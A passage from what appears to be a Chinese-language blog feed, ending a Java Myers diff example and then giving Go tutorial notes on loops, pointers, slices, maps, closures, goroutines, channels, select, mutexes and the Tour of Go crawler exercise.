class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;A-B-C-A-B-B-A&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="string">&quot;C-B-A-B-A-C&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] aArray = a.split(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> String[] bArray = b.split(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        List&lt;LineObject&gt; fromLineObjects = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;LineObject&gt; targetLineObjects = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; aArray.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">LineObject</span> <span class="variable">lineObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LineObject</span>();</span><br><span class="line">            lineObject.setIndex(index);</span><br><span class="line">            lineObject.setLineContent(aArray[i]);</span><br><span class="line">            fromLineObjects.add(lineObject);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bArray.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">LineObject</span> <span class="variable">lineObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LineObject</span>();</span><br><span class="line">            lineObject.setIndex(index);</span><br><span class="line">            lineObject.setLineContent(bArray[i]);</span><br><span class="line">            targetLineObjects.add(lineObject);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> List&lt;LineObject&gt; diff = <span class="keyword">new</span> <span class="title class_">MyersDiff</span>().diff(fromLineObjects, targetLineObjects);</span><br><span class="line">        diff.forEach(line -&gt; log.debug(line.toString()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



























]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>Go Tutorial</title>
    <url>/2021/04/06/go-tutorial/</url>
    <content><![CDATA[<ol>
<li><p>和 C、Java、JavaScript 之类的语言不同，Go 的 for 语句后面的三个构成部分外没有小括号， 大括号 { } 则是必须的。</p>
</li>
<li><p>C 的 while 在 Go 中叫做 for, 初始化语句和后置语句是可选的, 如果把循环条件也去掉就变成了 <strong>死循环</strong> 。当使用 for 循环遍历切片时，每次迭代都会返回两个值。第一个值为当前元素的下标，第二个值为该下标所对应元素的一份副本。</p>
</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> sum &lt; <span class="number">1000</span> &#123;</span><br><span class="line">	sum += sum</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// dead loop</span></span><br><span class="line"><span class="keyword">for</span> &#123;&#125;</span><br><span class="line"><span class="comment">// v 不用可直接省略</span></span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> pow &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;2**%d = %d\n&quot;</span>, i, v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li>if Go 的 if 语句与 for 循环类似，表达式外无需小括号 ( ) ，而大括号 { } 则是必须的. 同 for 一样， if 语句可以在条件表达式前执行一个简单的语句。该语句声明的变量作用域仅在 if(以及相连的else) 之内.</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pow</span><span class="params">(x, n, lim <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> v := math.Pow(x, n); v &lt; lim &#123;</span><br><span class="line">		<span class="keyword">return</span> v</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> lim</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li>Go 自动提供了在这些语言中每个 case 后面所需的 break 语句。 除非以 fallthrough (强制执行下一个分支，不会判断case)语句结束，否则分支会自动终止。 case 无需为常量，且取值不必为整数。甚至可为类型</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> v := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Twice %v is %v\n&quot;</span>, v, v*<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div>

<ol start="5">
<li><p>defer 栈，推迟的函数调用会被压入一个栈中。当外层函数返回时，被推迟的函数会按照后进先出的顺序调用。</p>
</li>
<li><p>Go 拥有指针。指针保存了值的内存地址。类型 <code>*T</code> 是指向 T 类型值的指针。其零值为 nil。<code>&amp;</code> 操作符会生成一个指向其操作数的指针。<code>*</code> 操作符表示指针指向的底层值。</p>
</li>
<li><p>如果我们有一个指向结构体的指针 p，那么可以通过 (*p).X 来访问其字段 X。不过这么写太啰嗦了，所以语言也允许我们使用隐式间接引用，直接写 p.X 就可以。</p>
</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">	X, Y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	v1 = Vertex&#123;<span class="number">1</span>, <span class="number">2</span>&#125;  <span class="comment">// 创建一个 Vertex 类型的结构体</span></span><br><span class="line">	p  = &amp;Vertex&#123;<span class="number">1</span>, <span class="number">2</span>&#125; <span class="comment">// 创建一个 *Vertex 类型的结构体（指针）</span></span><br><span class="line">	v2 = Vertex&#123;X: <span class="number">1</span>&#125;  <span class="comment">// Y:0 被隐式地赋予</span></span><br><span class="line">	v3 = Vertex&#123;&#125;      <span class="comment">// X:0 Y:0</span></span><br><span class="line">	<span class="comment">// &#123;1 2&#125; &amp;&#123;1 2&#125; &#123;1 0&#125; &#123;0 0&#125;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<ol start="8">
<li>更改切片的元素会修改其底层数组中对应的元素。切片的第一个参数会改变 <code>cap</code>（是从它的第一个元素开始数，到其底层数组元素末尾的个数），这会影响下次切片只能在当次切片的基础上切，已切除的无法再动。切片可以用内建函数 make 来创建，这也是你创建动态数组的方式。<code>append</code> 添加元素</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line">names := []<span class="keyword">struct</span> &#123;</span><br><span class="line">		i <span class="type">int</span></span><br><span class="line">		b <span class="type">bool</span></span><br><span class="line">	&#125;&#123; &#123;<span class="number">2</span>, <span class="literal">true</span>&#125;,&#125;</span><br><span class="line">b := names[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line">b := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">5</span>) <span class="comment">// len(b)=0, cap(b)=5</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol start="9">
<li>map 映射的零值为 nil</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="type">string</span>]Vertex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]Vertex)</span><br><span class="line">	m[<span class="string">&quot;Bell Labs&quot;</span>] = Vertex&#123;</span><br><span class="line">		<span class="number">40.68433</span>, <span class="number">-74.39967</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(m[<span class="string">&quot;Bell Labs&quot;</span>])</span><br><span class="line">    <span class="comment">//若 key 在 m 中，ok 为 true ；否则，ok 为 false, elem 为对应值或者零值</span></span><br><span class="line">    elem, ok = m[key]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol start="10">
<li>函数作为参数。闭包。结构体方法与函数参数为结构体并无区别</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compute</span><span class="params">(fn <span class="keyword">func</span>(<span class="type">float64</span>, <span class="type">float64</span>)</span></span> <span class="type">float64</span>) <span class="type">float64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> fn(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭包</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adder</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(x <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		sum += x</span><br><span class="line">		<span class="keyword">return</span> sum</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	pos, neg := adder(), adder()</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		fmt.Println(</span><br><span class="line">			pos(i),</span><br><span class="line">			neg(<span class="number">-2</span>*i),</span><br><span class="line">		)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">	X, Y <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Vertex)</span></span> Abs() <span class="type">float64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> math.Sqrt(v.X*v.X + v.Y*v.Y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	v := Vertex&#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Println(v.Abs())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="11">
<li>就是接收者的类型定义和方法声明必须在同一包内；不能为内建类型声明方法</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MyFloat <span class="type">float64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f MyFloat)</span></span> Abs() <span class="type">float64</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> f &lt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="type">float64</span>(-f)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">float64</span>(f)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	f := MyFloat(-math.Sqrt2)</span><br><span class="line">	fmt.Println(f.Abs())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="12">
<li>指针</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//比较前两个程序，你大概会注意到带指针参数的函数必须接受一个指针：</span></span><br><span class="line"><span class="keyword">var</span> v Vertex</span><br><span class="line">ScaleFunc(v, <span class="number">5</span>)  <span class="comment">// 编译错误！</span></span><br><span class="line">ScaleFunc(&amp;v, <span class="number">5</span>) <span class="comment">// OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//而以指针为接收者的方法被调用时，接收者既能为值又能为指针：</span></span><br><span class="line"><span class="keyword">var</span> v Vertex</span><br><span class="line">v.Scale(<span class="number">5</span>)  <span class="comment">// OK</span></span><br><span class="line">p := &amp;v</span><br><span class="line">p.Scale(<span class="number">10</span>) <span class="comment">// OK</span></span><br><span class="line">对于语句 v.Scale(<span class="number">5</span>)，即便 v 是个值而非指针，带指针接收者的方法也能被直接调用。 也就是说，由于 Scale 方法有一个指针接收者，为方便起见，Go 会将语句 v.Scale(<span class="number">5</span>) 解释为 (&amp;v).Scale(<span class="number">5</span>)。</span><br></pre></td></tr></table></figure></div>


<ol start="13">
<li>IO</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := strings.NewReader(<span class="string">&quot;Hello, Reader!&quot;</span>)</span><br><span class="line"></span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		n, err := r.Read(b)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;n = %v err = %v b = %v\n&quot;</span>, n, err, b)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;b[:n] = %q\n&quot;</span>, b[:n])</span><br><span class="line">		<span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// o_build_awesomeProject</span></span><br><span class="line"><span class="comment">// n = 8 err = &lt;nil&gt; b = [72 101 108 108 111 44 32 82]</span></span><br><span class="line"><span class="comment">// b[:n] = &quot;Hello, R&quot;</span></span><br><span class="line"><span class="comment">// n = 6 err = &lt;nil&gt; b = [101 97 100 101 114 33 32 82]</span></span><br><span class="line"><span class="comment">// b[:n] = &quot;eader!&quot;</span></span><br><span class="line"><span class="comment">// n = 0 err = EOF b = [101 97 100 101 114 33 32 82]</span></span><br><span class="line"><span class="comment">// b[:n] = &quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol start="14">
<li>goroutine : f, x, y 和 z 的求值发生在当前的 Go 程中，而 f 的执行发生在新的 Go 程中。Go 程在相同的地址空间中运行，因此在访问共享的内存时必须进行同步。sync 包提供了这种能力，不过在 Go 中并不经常用到，因为还有其它的办法（见下一页）。</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> f(x, y, z)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ch &lt;- v    <span class="comment">// 将 v 发送至信道 ch。</span></span><br><span class="line">v := &lt;-ch  <span class="comment">// 从 ch 接收值并赋予 v。</span></span><br></pre></td></tr></table></figure></div>

<ol start="15">
<li>默认情况下，发送和接收操作在另一端准备好之前都会阻塞。这使得 Go 程可以在没有显式的锁或竞态变量的情况下进行同步。<br>以下示例对切片中的数进行求和，将任务分配给两个 Go 程。一旦两个 Go 程完成了它们的计算，它就能算出最终的结果。</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">s := []<span class="type">int</span>&#123;<span class="number">7</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">-9</span>, <span class="number">4</span>, <span class="number">0</span>&#125;</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">go</span> sum(s[:<span class="built_in">len</span>(s)/<span class="number">2</span>], c)</span><br><span class="line"><span class="keyword">go</span> sum(s[<span class="built_in">len</span>(s)/<span class="number">2</span>:], c)</span><br><span class="line">x, y := &lt;-c, &lt;-c <span class="comment">// 从 c 中接收</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个参数可作为缓冲，仅当信道的缓冲区填满后，向其发送数据时才会阻塞。当缓冲区满时，接受方会阻塞。</span></span><br><span class="line"></span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line">ch &lt;- <span class="number">1</span></span><br><span class="line">ch &lt;- <span class="number">2</span></span><br><span class="line"><span class="comment">//fatal error: all goroutines are asleep - deadlock!</span></span><br><span class="line"><span class="comment">// goroutine 1 [chan send]:</span></span><br></pre></td></tr></table></figure></div>

<ol start="16">
<li><p>注意： 只有发送者才能关闭信道，而接收者不能。向一个已经关闭的信道发送数据会引发程序恐慌（panic）。还要注意： 信道与文件不同，通常情况下无需关闭它们。只有在必须告诉接收者不再有需要发送的值时才有必要关闭，例如终止一个 range 循环。</p>
</li>
<li><p>select  会阻塞到某个分支可以继续执行为止，这时就会执行该分支。当多个分支都准备好时会随机选择一个执行。其它分支都没有准备好时，default 分支就会执行。为了在尝试发送或者接收时不发生阻塞，可使用 default 分支：</p>
</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(c, quit <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	x, y := <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> c &lt;- x:</span><br><span class="line">			x, y = y, x+y</span><br><span class="line">		<span class="keyword">case</span> &lt;-quit:</span><br><span class="line">			fmt.Println(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			fmt.Println(<span class="string">&quot;waiting.&quot;</span>)</span><br><span class="line">			time.Sleep(<span class="number">50</span> * time.Millisecond)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">	quit := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">			fmt.Println(&lt;-c)</span><br><span class="line">		&#125;</span><br><span class="line">		quit &lt;- <span class="number">0</span></span><br><span class="line">	&#125;()</span><br><span class="line">	fibonacci(c, quit)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<p>tips: 二叉树检测相同序列</p>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Walk 步进 tree t 将所有的值从 tree 发送到 channel ch。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Walk</span><span class="params">(t *tree.Tree, ch <span class="keyword">chan</span> <span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> t.Left != <span class="literal">nil</span>&#123;</span><br><span class="line">        Walk(t.Left, ch)</span><br><span class="line">    &#125; </span><br><span class="line">    ch &lt;- t.Value</span><br><span class="line">    <span class="keyword">if</span> t.Right !=<span class="literal">nil</span>&#123;</span><br><span class="line">        Walk(t.Right, ch)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Same 检测树 t1 和 t2 是否含有相同的值。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Same</span><span class="params">(t1, t2 *tree.Tree)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    total := <span class="number">10</span></span><br><span class="line">    ch1, ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, total), <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, total)</span><br><span class="line">    <span class="keyword">go</span> Walk(t1, ch1)</span><br><span class="line">    <span class="keyword">go</span> Walk(t2, ch2)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> &lt;-ch1 != &lt;-ch2 &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="18">
<li>sync.Mutex</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// SafeCounter 的并发使用是安全的。</span></span><br><span class="line"><span class="keyword">type</span> SafeCounter <span class="keyword">struct</span> &#123;</span><br><span class="line">	v   <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span></span><br><span class="line">	mux sync.Mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Inc 增加给定 key 的计数器的值。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SafeCounter)</span></span> Inc(key <span class="type">string</span>) &#123;</span><br><span class="line">	c.mux.Lock()</span><br><span class="line">	<span class="comment">// Lock 之后同一时刻只有一个 goroutine 能访问 c.v</span></span><br><span class="line">	c.v[key]++</span><br><span class="line">	c.mux.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Value 返回给定 key 的计数器的当前值。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SafeCounter)</span></span> Value(key <span class="type">string</span>) <span class="type">int</span> &#123;</span><br><span class="line">	c.mux.Lock()</span><br><span class="line">	<span class="comment">// Lock 之后同一时刻只有一个 goroutine 能访问 c.v</span></span><br><span class="line">	<span class="keyword">defer</span> c.mux.Unlock()</span><br><span class="line">	<span class="keyword">return</span> c.v[key]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	c := SafeCounter&#123;v: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> c.Inc(<span class="string">&quot;somekey&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	time.Sleep(time.Second)</span><br><span class="line">	fmt.Println(c.Value(<span class="string">&quot;somekey&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="19">
<li>summary crawler</li>
</ol>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Fetcher <span class="keyword">interface</span> &#123;</span><br><span class="line">	<span class="comment">// Fetch 返回 URL 的 body 内容，并且将在这个页面上找到的 URL 放到一个 slice 中。</span></span><br><span class="line">	Fetch(url <span class="type">string</span>) (body <span class="type">string</span>, urls []<span class="type">string</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Crawl 使用 fetcher 从某个 URL 开始递归的爬取页面，直到达到最大深度。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Crawl</span><span class="params">(url <span class="type">string</span>, depth <span class="type">int</span>, fetcher Fetcher)</span></span> &#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 并行的抓取 URL。</span></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 不重复抓取页面。</span></span><br><span class="line">        <span class="comment">// 下面并没有实现上面两种情况：</span></span><br><span class="line">	<span class="keyword">if</span> depth &lt;= <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	body, urls, err := fetcher.Fetch(url)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;found: %s %q\n&quot;</span>, url, body)</span><br><span class="line">	<span class="keyword">for</span> _, u := <span class="keyword">range</span> urls &#123;</span><br><span class="line">		Crawl(u, depth<span class="number">-1</span>, fetcher)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Crawl(<span class="string">&quot;https://golang.org/&quot;</span>, <span class="number">4</span>, fetcher)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fakeFetcher 是返回若干结果的 Fetcher。</span></span><br><span class="line"><span class="keyword">type</span> fakeFetcher <span class="keyword">map</span>[<span class="type">string</span>]*fakeResult</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> fakeResult <span class="keyword">struct</span> &#123;</span><br><span class="line">	body <span class="type">string</span></span><br><span class="line">	urls []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f fakeFetcher)</span></span> Fetch(url <span class="type">string</span>) (<span class="type">string</span>, []<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> res, ok := f[url]; ok &#123;</span><br><span class="line">		<span class="keyword">return</span> res.body, res.urls, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;not found: %s&quot;</span>, url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fetcher 是填充后的 fakeFetcher。</span></span><br><span class="line"><span class="keyword">var</span> fetcher = fakeFetcher&#123;</span><br><span class="line">	<span class="string">&quot;https://golang.org/&quot;</span>: &amp;fakeResult&#123;</span><br><span class="line">		<span class="string">&quot;The Go Programming Language&quot;</span>,</span><br><span class="line">		[]<span class="type">string</span>&#123;</span><br><span class="line">			<span class="string">&quot;https://golang.org/pkg/&quot;</span>,</span><br><span class="line">			<span class="string">&quot;https://golang.org/cmd/&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;https://golang.org/pkg/&quot;</span>: &amp;fakeResult&#123;</span><br><span class="line">		<span class="string">&quot;Packages&quot;</span>,</span><br><span class="line">		[]<span class="type">string</span>&#123;</span><br><span class="line">			<span class="string">&quot;https://golang.org/&quot;</span>,</span><br><span class="line">			<span class="string">&quot;https://golang.org/cmd/&quot;</span>,</span><br><span class="line">			<span class="string">&quot;https://golang.org/pkg/fmt/&quot;</span>,</span><br><span class="line">			<span class="string">&quot;https://golang.org/pkg/os/&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;https://golang.org/pkg/fmt/&quot;</span>: &amp;fakeResult&#123;</span><br><span class="line">		<span class="string">&quot;Package fmt&quot;</span>,</span><br><span class="line">		[]<span class="type">string</span>&#123;</span><br><span class="line">			<span class="string">&quot;https://golang.org/&quot;</span>,</span><br><span class="line">			<span class="string">&quot;https://golang.org/pkg/&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;https://golang.org/pkg/os/&quot;</span>: &amp;fakeResult&#123;</span><br><span class="line">		<span class="string">&quot;Package os&quot;</span>,</span><br><span class="line">		[]<span class="type">string</span>&#123;</span><br><span 